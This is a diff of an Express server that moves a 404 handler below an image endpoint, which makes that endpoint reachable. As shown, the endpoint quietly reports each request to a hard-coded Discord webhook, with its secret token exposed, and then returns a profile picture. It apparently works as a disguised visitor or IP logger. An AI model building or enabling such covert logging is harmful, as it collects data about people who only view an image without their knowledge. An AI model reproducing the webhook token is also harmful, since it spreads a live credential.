@@ -24,17 +24,6 @@ app.post('/api/echo', (req, res) => {
   res.json({ received: req.body });
 });
 
-// 404 handler - JSON for /api paths, static fallback otherwise
-app.use((req, res, next) => {
-  if (req.path.startsWith('/api')) {
-    return res.status(404).json({ error: 'Not Found' });
-  }
-
-  // For any other path, let express.static handle or return index.html
-  res.status(404).sendFile(path.join(__dirname, '..', 'public', '404.html'));
-});
-
-// return image on endpoint/https/image
 app.get('/api/endpoint/https/image', (req, res) => {
   // send response information to discord webhook
   fetch('https://discord.com/api/webhooks/1366407365775069226/F3G_5Xp3Yhlf8Km8fSQwpPMLdHW4DSz8VePxdKkV0hPxntUXH1iYhLwlzAewvpaPC7e7', {
@@ -68,6 +57,18 @@ app.get('/api/endpoint/https/image', (req, res) => {
   }).catch(err => console.error('Error sending webhook:', err));
   res.sendFile(path.join(__dirname, '..', 'public', 'profile_picture.png'));
 });
+// 404 handler - JSON for /api paths, static fallback otherwise
+app.use((req, res, next) => {
+  if (req.path.startsWith('/api')) {
+    return res.status(404).json({ error: 'Not Found' });
+  }
+
+  // For any other path, let express.static handle or return index.html
+  res.status(404).sendFile(path.join(__dirname, '..', 'public', '404.html'));
+});
+
+// return image on endpoint/https/image
+
 
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
